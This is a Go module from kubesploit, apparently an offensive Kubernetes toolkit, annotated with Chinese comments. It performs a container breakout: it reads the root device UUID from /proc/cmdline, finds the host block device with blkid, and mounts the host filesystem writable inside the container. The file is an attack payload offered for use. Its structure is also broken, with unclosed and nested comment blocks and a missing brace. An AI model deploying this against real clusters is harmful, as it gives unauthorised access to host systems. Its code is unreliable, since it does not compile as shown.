# `kubesploit\data\modules\sourcecode\go\mountBreakoutWithBlkid\main.go`

```
package main
// 声明当前文件所属的包为 main

import (
	"fmt"
	"github.com/LDCS/qslinux/blkid"
	// 导入 fmt、blkid、ioutil、log、net、os、strconv、strings、syscall 包
	"io/ioutil"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
)

func check(e error) {
	// 定义一个函数 check，用于检查错误
	if e != nil {
		// 如果错误不为空，抛出异常
		panic(e)
	}
}
// 处理客户端请求的函数
func handleRequest(conn net.Conn) {
	// 创建一个缓冲区来存储传入的数据
	buf := make([]byte, 1024)
	// 读取传入的连接数据到缓冲区中
	_, err := conn.Read(buf)
	if err != nil {
		fmt.Println("Error reading:", err.Error())
	}
	// 向连接方发送响应
	conn.Write([]byte("Message received."))
	// 处理完连接后关闭连接
	conn.Close()
}

// 主函数，这个负载使用 BLKID 库，不适用于 Yaegi
func main(){
/*
	conn, _ := net.Listen("tcp", "127.0.0.1:1330")

	// 当应用程序关闭时关闭监听器
// 延迟关闭连接，确保在函数结束时关闭连接
defer conn.Close()
// 无限循环，监听传入的连接
for {
    // 接受传入的连接
    conn, err := conn.Accept()
    if err != nil {
        fmt.Println("Error accepting: ", err.Error())
        os.Exit(1)
    }
    // 在新的 goroutine 中处理连接
    go handleRequest(conn)
}

// 读取 /proc/cmdline 文件的内容
dat, err := ioutil.ReadFile("/proc/cmdline")
// 检查错误
check(err)
// 将文件内容转换为字符串
cmdline := string(dat)
// 使用空格分割命令行参数
splittedCmdLine := strings.Split(cmdline, " ")

var uuid string

// 提取设备的 UUID
	// 遍历分割后的命令行参数列表
	for _, splitLine := range splittedCmdLine {
		// 如果分割后的行以"root=UUID"开头
		if strings.HasPrefix(splitLine, "root=UUID"){
			// 提取UUID值
			uuid = splitLine[10:]
		}
	}

	// 获取blkid映射
	rmap := blkid.Blkid(false)
	var key string
	var result *blkid.Blkiddata

	// 寻找匹配UUID的设备
	for key, result = range rmap {
		// 如果找到匹配的UUID
		if result.Uuid_ == uuid {
			// 打印设备名
			fmt.Printf("Devname: %q\n", key)
			// 结束循环
			break
		}
	}

	/*
	// 打印 result 对象的 Uuid_ 字段
	fmt.Printf("Uuid_=%q\n", result.Uuid_)
	// 打印 result 对象的 Uuidsub_ 字段
	fmt.Printf("Uuidsub_=%q\n", result.Uuidsub_)
	// 打印 result 对象的 Type_ 字段
	fmt.Printf("Type_=%q\n", result.Type_)
	// 打印 result 对象的 Label_ 字段
	fmt.Printf("Label_=%q\n", result.Label_)
	// 打印 result 对象的 Parttype_ 字段
	fmt.Printf("Parttype_=%q\n", result.Parttype_)
	// 打印 result 对象的 Partuuid_ 字段
	fmt.Printf("Partuuid_=%q\n", result.Partuuid_)
	// 打印 result 对象的 Partlabel_ 字段
	fmt.Printf("Partlabel_ =%q\n", result.Partlabel_)

	// 创建文件夹
	dirId := 0
	var dirPath string

	// 如果没有权限在根目录下写入文件，则考虑写入 /tmp 目录
	for {
		// 拼接文件夹路径
		dirPath = "/mnt" + strconv.Itoa(dirId)
		// 检查文件夹是否存在
		if _, err := os.Stat(dirPath); os.IsNotExist(err) {
			// 如果文件夹不存在，则创建文件夹
			os.Mkdir(dirPath, os.ModeDir)
			// 退出循环
			break
		} else {
		// 增加目录ID
		dirId += 1
	}

	// 挂载
	// 使用系统调用挂载文件系统
	if err := syscall.Mount(key, dirPath, result.Type_, 0, "w"); err != nil {
		// 如果挂载失败，记录错误信息并终止程序
		log.Printf("Mount(\"%s\", \"%s\", \"%s\", 0, \"w\")\n",key, dirPath, result.Type_)
		log.Fatal(err)
	}

	// 打印挂载成功的信息
	fmt.Printf("[*] 成功挂载 \"%s\" 到 \"%s\"", key, dirPath)
	// 打印主机文件夹的路径
	fmt.Printf("[*] 主机文件夹路径为: \"%s\"", dirPath)
}
```